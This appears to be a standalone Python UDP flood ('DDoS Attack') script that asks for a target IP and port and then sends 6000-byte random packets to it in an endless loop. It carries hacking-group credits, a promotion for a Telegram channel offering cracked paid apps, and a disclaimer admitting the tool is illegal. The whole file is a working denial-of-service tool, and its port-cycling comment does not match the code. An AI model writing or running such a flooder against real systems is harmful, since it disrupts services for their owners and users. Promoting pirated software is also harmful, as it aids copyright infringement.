import socket
import random
import os
import time

# Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

# Erstellen eines UDP Sockets
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Erzeugung von zufälligen 6000 Bytes für das Paket
bytes = random._urandom(6000)  # Paketgröße auf 6000 Bytes gesetzt

# Bildschirm löschen und Text anzeigen
os.system("clear")
os.system("figlet DDoS Attack")

print("\033[91m")
print("Coded By : Mr.BL4Z3")
print("Author   : T34m V18rs")
print("Github   : github.com/T34mV18rs")
print("Fb Page  : facebook.com/TeamVirusOfficial")
print("FB Group : facebook.com/groups/mohinhossen")
print("Telegram : t.me/Crackerspace")
print("Join Cracker Space TG Group To Get Premium Apk(s) Free")
print("Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk,We'll Be Not Responsible For Kind Of Problems")

print("\033[93m")
ip = input("IP Target : ")
port = int(input("Port       : "))

# Lade die DDoS-Nachricht
os.system("clear")
os.system("figlet Attack Starting")
print("\033[92m")
print("[                    ] 0% ")
time.sleep(1)
print("[=====               ] 25%")
time.sleep(1)
print("[==========          ] 50%")
time.sleep(1)
print("[===============     ] 75%")
time.sleep(1)
print("[====================] 100%")
time.sleep(3)

sent = 0

# Endlosschleife zum Senden von Paketen
while True:
    sock.sendto(bytes, (ip, port))
    sent += 1
    print(f"Sent {sent} packet to {ip} through port: {port}")
    
    # Port zurücksetzen, wenn der höchste Wert erreicht ist
    if port == 65534:
        port = 1
